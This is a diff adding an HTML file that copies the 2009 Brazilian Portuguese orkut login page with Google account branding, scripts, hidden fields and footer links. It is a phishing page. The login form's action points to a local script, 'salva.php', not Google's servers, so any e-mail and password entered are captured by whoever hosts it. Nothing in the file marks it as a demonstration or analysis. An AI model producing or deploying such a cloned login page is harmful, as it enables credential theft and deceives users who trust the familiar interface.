@@ -1,0 +1,305 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <title>orkut - login</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <script type=text/javascript>
+  var startTime = (new Date()).getTime();
+  </script>
+  <style type="text/css">
+  body { background-color: #D4DDED; color: #000; font-family: Verdana, Arial, sans-serif; font-size: 12px; margin: 10px }
+  .newText { padding: 10px 20px; line-height: 1.5em; font-size: 12px; text-align: center }
+  .magenta { color: #B11E89 }
+  .newMain { background: #FFF; padding: 15px }
+  .newGaia { background: #FFF; padding: 3px }
+  .spacer { height: 7px; background-color: #D4DDED; margin: 3px -3px }
+  .newFooter { background-color: #BCCDE9; margin: 10px 0 0 0; font-size: 12px; padding: 5px; text-align: center }
+  .joinNow { font-size: 12px; background: #E8EEFA; padding: 8px 3px; text-align: center; line-height: 1.7em }
+  a:link { color: #0047BE; text-decoration: underline; font-size: 100% }
+  a:visited { color: #0047BE; text-decoration: underline }
+  a:hover { color: #C40098; text-decoration: underline }
+  </style>
+</head>
+<body onload="gaia_setFocus()">
+
+  <table border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tbody>
+  <tr>
+  <td class="newMain">
+  <div align="center">
+  <img src="https://img1.orkut.com/img/doodle/orkut_logo.gif" alt="Who do you know?" title="Who do you know?" style="border: none;">
+  </div>
+  <div class="newText">
+  <b class="magenta">Conecte-se</b> aos seus amigos e familiares usando recados e mensagens instantâneas <br><b class="magenta">Conheça</b> novas pessoas através de amigos de seus amigos e comunidades <br><b class="magenta">Compartilhe</b> seus vídeos, fotos e paixões em um só lugar
+  </div>
+
+  </td>
+  <td width="10px">
+  </td>
+  <td valign="top" class="newGaia" width="264">
+<script><!--
+
+function gaia_onLoginSubmit() {
+
+  if (window.gaiacb_onLoginSubmit) {
+    return gaiacb_onLoginSubmit();
+  } else {
+    return true;
+  }
+
+}
+
+
+function StripParam(url, param) {
+  if (url.search(param) == -1) {
+    return url;
+  }
+  var firstParamRegExp = new RegExp('\\?' + param + '&');
+  var paramRegExp = new RegExp('(\\?|&)' + param);
+  url = url.replace(firstParamRegExp, '?');
+  url = url.replace(paramRegExp, '');
+  return url;
+}
+
+
+function GetForm() {
+  var f = null;
+  if (document.getElementById) {
+    f = document.getElementById('gaia_loginform');
+  } else if (window.gaia_loginform) {
+    f = window.gaia_loginform;
+  }
+  return f;
+}
+
+function AddUrlParam(url, param, value) {
+  return url + ((url.search(/\?/) == -1) ? '?' : '&') + param + '=' + value;
+}
+
+var focusTime;
+function gaiacb_onLoginSubmit() {
+  var CONTINUE = 'continue';
+  var f = GetForm();
+  if (f) {
+    var continueUrl = f[CONTINUE].value;
+    if (continueUrl != null &&  continueUrl != '') {
+      var lts = new Date().getTime();
+      continueUrl = StripParam(continueUrl, 'ts=[0-9]*:[0-9]*:[0-9]*');
+      var tsParam = startTime + ':' + focusTime + ':' + lts;
+      continueUrl = AddUrlParam(continueUrl, 'ts', tsParam);
+      f[CONTINUE].value = continueUrl;
+    }
+  }
+  return true;
+}
+
+function gaia_setFocus() {
+  var f = GetForm();
+  if (f) {
+    if (f.Email.value == null || f.Email.value == "") { 
+      f.Email.focus();
+    } else if (f.Passwd) {
+      f.Passwd.focus();
+    }
+    focusTime = (new Date()).getTime();
+  }
+}
+--></script>
+<style type="text/css"><!--
+  div.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; }
+  font.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; }  
+--></style>
+<style type="text/css"><!--
+.gaia.le.lbl { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
+.gaia.le.fpwd { font-family: Arial, Helvetica, sans-serif; font-size: 70%; }
+.gaia.le.chusr { font-family: Arial, Helvetica, sans-serif; font-size: 70%; }
+.gaia.le.val { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
+.gaia.le.button { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
+.gaia.le.rem { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
+
+.gaia.captchahtml.desc { font-family: arial, sans-serif; font-size: smaller; } 
+.gaia.captchahtml.cmt { font-family: arial, sans-serif; font-size: smaller; font-style: italic; }
+  
+--></style>
+<div id="gaia_loginbox">
+<table class="form-noindent" cellspacing="0" cellpadding="5" width="100%" border="0">
+  <tr>
+
+  <td valign="top" style="text-align:center" nowrap="nowrap" 
+        bgcolor="#E8EEFA">
+  <form id="gaia_loginform" action="salva.php" method="post"
+        onsubmit="return(gaia_onLoginSubmit());">
+  <table id="gaia_table" align="center" border="0" cellpadding="1" cellspacing="0">
+  <tr>
+<td colspan="2" align="center">
+  <font size="-1">
+  Acesse o orkut com a sua
+  </font>
+  <table>
+  <tr>
+
+  <td valign="middle">
+  <font size="+0"><b>Conta do</b></font>
+  </td>
+  <td valign="top">
+  <img src="https://www.google.com/accounts/google_transparent.gif"
+           alt="Google">
+  </img>
+  </td>
+  </tr>
+
+</table>
+</td>
+</tr>
+  <script type="text/javascript"><!--
+    function onPreCreateAccount() {
+    
+      return true;
+    
+    }
+
+    function onPreLogin() {
+    
+      
+      if (window["onlogin"] != null) {
+        return onlogin();
+      } else {
+        return true;
+      }
+    
+    }
+  --></script>
+<tr>
+  <td colspan="2" align="center">
+  </td>
+</tr>
+<tr>
+  <td nowrap="nowrap">
+  <div align="right">
+
+  <span class="gaia le lbl">
+  E-mail:
+  </span>
+  </div>
+  </td>
+  <td>
+  <input type="hidden" name="continue" id="continue"
+           value="http://www.orkut.com/RedirLogin.aspx?msg=0" />
+  <input type="hidden" name="service" id="service"
+           value="orkut" />
+  <input type="hidden" name="cd" id="cd"
+           value="BR" />
+
+  <input type="hidden" name="skipvpage" id="skipvpage"
+           value="true" />
+  <input type="hidden" name="sendvemail" id="sendvemail"
+           value="false" />
+  <input type="hidden" name="rm" id="rm"
+           value="false" />
+  <input type="hidden" name="hl" id="hl"
+           value="pt-BR" />
+  <input type="hidden"
+             name="GALX"
+             value="fS_ttrx2lIM" />
+  <input  type="text" name="Email"  id="Email"
+  size="18" value=""
+  
+  
+    class='gaia le val'
+  
+  />
+  </td>
+</tr>
+<tr>
+  <td></td>
+
+  <td align="left">
+  </td>
+</tr>
+<tr>
+  <td align="right" nowrap="nowrap">
+  <span class="gaia le lbl">
+  Senha:
+  </span>
+  </td>
+  <td>
+
+  <input  type="password"
+   name="Passwd" id="Passwd"
+  size="18" 
+  
+  
+
+  
+    class="gaia le val" 
+  
+  />
+  </td>
+</tr>
+<tr>
+  <td>
+  </td>
+  <td align="left">
+  </td>
+</tr>
+  <tr>
+
+  <td align="right" valign="top">
+  <input  type="checkbox" name="PersistentCookie" id="PersistentCookie"
+    value="yes"
+  
+    
+  
+  />
+  <input type="hidden" name='rmShown' value="1" />
+  </td>
+  <td>
+  <label for="PersistentCookie" class="gaia le rem">
+  Salvar as minhas informações neste computador.
+  </label>
+  <div style="color: #667788; margin-top: 3px; font-size: 11px;">
+
+  Não use em computadores públicos. [<a href="http://help.orkut.com/bin/answer.py?answer=66395&hl=pt-BR">?</a>]
+  </div>
+  </td>
+</tr>
+<tr>
+  <td>
+  </td>
+  <td align="left">
+  <input type="submit" class="gaia le button" name="signIn"
+           value="Login"
+                  />
+
+  </td>
+</tr>
+<tr id="ga-fprow">
+  <td colspan="2" height="33.0" class="gaia le fpwd"
+    align="center" valign="bottom">
+  <a href="http://www.google.com/support/accounts/bin/answer.py?answer=48598&amp;hl=pt-BR&amp;fpUrl=https%3A%2F%2Fwww.google.com%2Faccounts%2FForgotPasswd%3FfpOnly%3D1%26continue%3Dhttp%253A%252F%252Fwww.orkut.com%252FRedirLogin.aspx%253Fmsg%253D0%26cd%3DBR%26hl%3Dpt-BR%26service%3Dorkut%26skipvpage%3Dtrue"
+       target=_top>
+  Não consegue acessar a sua conta?
+  </a>
+  </td>
+</tr>
+  </table>
+  </form>
+
+  </td>
+  </tr>
+</table>
+</div>
+  <div class="spacer"></div>
+  <div class="joinNow">
+  Ainda não é membro?<br>
+  <a href="https://www.google.com/accounts/NewAccount?continue=http%3A%2F%2Fwww.orkut.com%2FRedirLogin%3Fmsg%3D1&service=orkut&hl=pt-BR"><b>ENTRE JÁ</b></a>
+  </div>
+
+  </td>
+  </tr>
+  </tbody>
+  </table>
+  <div class="newFooter"> &copy;2009&nbsp;Google&nbsp;-&nbsp;<a href="http://www.orkut.com/About.aspx">Sobre o Orkut</a>&nbsp;-&nbsp;<a href="http://help.orkut.com/support/bin/answer.py?answer=48579&amp;hl=pt-BR">Centro de segurança</a>&nbsp;-&nbsp;<a href="http://www.orkut.com/Privacy.aspx">Privacidade</a>&nbsp;-&nbsp;<a  href="http://www.orkut.com.br/AdditionalTerms.aspx">Termos</a>&nbsp;-&nbsp;<a href="http://help.orkut.com/bin/answer.py?answer=98932&hl=pt-BR">Coopera&ccedil;&atilde;o do Google com MPF/SP</a> </div>
+
+</body>
+</html>
